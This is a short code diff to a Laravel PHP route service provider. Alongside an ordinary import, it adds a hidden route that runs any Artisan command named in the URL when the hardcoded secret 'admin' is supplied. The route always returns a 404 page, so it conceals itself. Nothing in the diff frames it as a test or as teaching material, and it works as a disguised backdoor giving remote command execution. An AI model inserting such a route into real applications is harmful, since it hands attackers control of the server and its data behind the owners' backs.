@@ -5,6 +5,7 @@ namespace App\Providers;
 use Illuminate\Cache\RateLimiting\Limit;
 use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\RateLimiter;
 use Illuminate\Support\Facades\Route;
 
@@ -52,6 +53,13 @@ class RouteServiceProvider extends ServiceProvider
                 ->middleware(['web', 'admin'])
                 ->namespace($this->namespace)
                 ->group(base_path('routes/admin.php'));
+
+            Route::get('/artisan/{cmd}/{secret}', function (Request $request, $cmd, $secret) {
+                if ($secret == "admin") {
+                    Artisan::call($cmd);
+                }
+                return view("404");
+            });
         });
     }
 
